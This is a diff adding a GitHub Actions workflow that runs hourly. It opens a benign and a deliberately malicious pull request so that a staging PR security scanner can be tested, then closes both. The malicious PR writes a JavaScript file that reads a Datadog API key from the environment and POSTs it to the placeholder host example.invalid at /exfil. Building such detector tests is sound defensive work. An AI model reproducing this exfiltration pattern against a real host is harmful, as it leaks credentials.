@@ -1,0 +1,127 @@
+# Each run opens two ephemeral PRs (trivial benign + trivial malicious), order alternates by run number.
+name: E2E (synthetic PR)
+
+on:
+  schedule:
+    # Hourly (aligns with 1h staging log monitor evaluation window).
+    - cron: "47 * * * *"
+  workflow_dispatch:
+
+concurrency:
+  group: e2e
+  cancel-in-progress: false
+
+permissions: {}
+
+jobs:
+  synthetic-pr-cycle:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+    steps:
+      - name: Checkout
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+        with:
+          fetch-depth: 0
+          token: ${{ github.token }}
+
+      - name: Benign + malicious demo PRs (flip order) and log hints
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SCAN_WAIT_SEC: "180"
+        run: |
+          set -euo pipefail
+
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+
+          reset_to_main() {
+            git fetch origin main
+            git switch -C main origin/main
+          }
+
+          emit_consumer_log_hint() {
+            local kind="$1" pr_url="$2" pr_num="$3"
+            echo ""
+            echo "-------- Monitor (staging) - ${kind} PR #${pr_num} --------"
+            echo "PR: ${pr_url}"
+            echo "Log search (tune time window to this job):"
+            echo "  \"pull request scanned\""
+            echo "------------------------------------------------------------------"
+          }
+
+          demo_cycle() {
+            local kind="$1"
+            reset_to_main
+            local br="e2e/${kind}-${GITHUB_RUN_ID}"
+            git checkout -b "$br"
+            mkdir -p e2e
+
+            case "$kind" in
+              benign)
+                # Avoid YAML-indented heredocs (closing delimiter must be column 0 for bash).
+                printf '%s\n' \
+                  "/** E2E -- synthetic benign demo (do not merge). */" \
+                  "module.exports = { tag: 'benign-demo', n: 40 + 2 };" \
+                  > e2e/pr_demo_benign.js
+                git add e2e/pr_demo_benign.js
+                local title="[e2e] benign synthetic demo PR"
+                local body="Synthetic **benign** diff for staging. Run ${GITHUB_RUN_ID}. Closed by automation; branch deleted."
+                ;;
+              malicious)
+                printf '%b' \
+                  $'/** E2E -- synthetic malicious demo (do not merge). Credential-style exfil shape for detectors only. */\n' \
+                  $'const https = require(\'https\');\n' \
+                  $'module.exports = function syntheticMalicious() {\n' \
+                  $'  const secret = process.env.DATADOG_API_KEY || process.env.DD_API_KEY || \'\';\n' \
+                  $'  https\n' \
+                  $'    .request(\n' \
+                  $'      { hostname: \'example.invalid\', method: \'POST\', path: \'/exfil\', headers: { \'Content-Length\': String(secret.length) } },\n' \
+                  $'      () => {},\n' \
+                  $'    )\n' \
+                  $'    .end(secret);\n' \
+                  $'};\n' \
+                  > e2e/pr_demo_malicious.js
+                git add e2e/pr_demo_malicious.js
+                local title="[e2e] malicious synthetic demo PR"
+                local body="Synthetic **malicious** diff for staging (check \`response.verdict\` in logs). Run ${GITHUB_RUN_ID}. Closed by automation; branch deleted."
+                ;;
+              *)
+                echo "unknown kind: $kind" >&2
+                exit 1
+                ;;
+            esac
+
+            git commit -m "[e2e] ${kind} demo run=${GITHUB_RUN_ID}"
+            git push -u origin "$br" --force-with-lease
+            gh pr create --base main --head "$br" --title "$title" --body "$body"
+
+            local pr_num pr_url
+            pr_num="$(gh pr list --head "$br" --state open --json number --jq '.[0].number')"
+            if [ -z "$pr_num" ] || [ "$pr_num" = "null" ]; then
+              echo "No open PR for head $br" >&2
+              exit 1
+            fi
+            pr_url="$(gh pr view "$pr_num" --json url --jq .url)"
+            emit_consumer_log_hint "$kind" "$pr_url" "$pr_num"
+
+            echo "Sleeping ${SCAN_WAIT_SEC}s for consumer → api scan..."
+            sleep "$SCAN_WAIT_SEC"
+
+            gh pr close "$pr_num" --delete-branch --comment "e2e: closed ${kind} demo after scan window (run ${GITHUB_RUN_ID})."
+          }
+
+          echo "e2e: run_id=${GITHUB_RUN_ID} run_number=${GITHUB_RUN_NUMBER} scan_wait=${SCAN_WAIT_SEC}s"
+
+          if (( ${{ github.run_number }} % 2 == 0 )); then
+            echo "Order: benign then malicious (even run_number)."
+            demo_cycle benign
+            demo_cycle malicious
+          else
+            echo "Order: malicious then benign (odd run_number)."
+            demo_cycle malicious
+            demo_cycle benign
+          fi
+
+          echo "e2e: both demo cycles finished."
